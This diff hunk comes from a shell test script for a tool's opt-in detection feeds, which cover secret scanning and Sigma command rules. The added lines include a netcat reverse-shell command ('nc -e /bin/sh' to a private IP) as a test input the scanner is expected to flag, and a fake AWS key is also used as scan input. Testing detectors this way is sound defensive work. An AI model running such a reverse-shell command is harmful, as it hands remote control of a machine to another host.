@@ -30,6 +30,8 @@ FS="$("$SHIM" feeds status </dev/null 2>&1)"; printf '%s' "$FS" | grep -q "NOT o
 "$SHIM" feeds update </dev/null >/dev/null 2>&1 && no "feeds update ran without opt-in" || ok "feeds update refuses without opt-in"
 "$SHIM" feeds opt-in </dev/null >"$HOME/optin.log" 2>&1 && [ -f "$HOME/.blitz/feeds/secrets/rules.json" ] && ok "blitzpi feeds opt-in downloads + compiles the secrets feed ($(grep -o '[0-9]* rules' "$HOME/optin.log" | head -1))" || { no "opt-in failed"; cat "$HOME/optin.log"; }
 "$SHIM" feeds scan 'export AWS_SECRET=AKIAZZ7XQ2BR4TSTKEYA' </dev/null 2>&1 | grep -q "aws-access-token" && ok "feeds scan finds an AWS key" || no "feeds scan missed the AWS key"
+[ -f "$HOME/.blitz/feeds/commands/rules.json" ] && ok "opt-in also installed the commands feed (Sigma, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/commands/manifest.json"))" || no "commands feed missing"
+"$SHIM" feeds scan 'nc -e /bin/sh 10.0.0.1 4444' </dev/null 2>&1 | grep -q "Netcat Reverse Shell" && ok "feeds scan flags a reverse shell (Sigma)" || no "Sigma scan missed the reverse shell"
 "$SHIM" feeds opt-out </dev/null >/dev/null 2>&1 && [ ! -e "$HOME/.blitz/feeds/opt-in" ] && [ -f "$HOME/.blitz/feeds/secrets/rules.json" ] && ok "opt-out keeps files, drops consent" || no "opt-out state wrong"
 
 echo "== run it (no PATH, no bun on PATH, from a foreign cwd)"
